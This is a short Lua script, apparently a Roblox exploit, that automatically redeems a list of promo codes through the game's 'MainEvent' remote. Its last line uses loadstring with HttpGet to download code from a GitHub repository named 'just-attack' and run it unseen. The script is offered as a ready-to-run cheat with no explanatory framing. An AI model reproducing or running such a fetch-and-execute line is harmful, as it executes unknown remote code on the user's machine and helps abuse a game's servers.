spawn(function()
local codes = {
    "SHRIMP",
    "VIP",
    "RUBY",
    "DAUP",
    "DACARNIVAL",
    "TRADEME!"

}
local successfulCodes = {}


local function redeemCode(code)

    local args = {
        [1] = "EnterPromoCode",
        [2] = code
    }


    game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
    wait(10) 


    local successIndicator = false


end

for i,v in pairs(codes) do
    redeemCode(v)
end

end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/standzzz/just-attack/refs/heads/main/src"))()
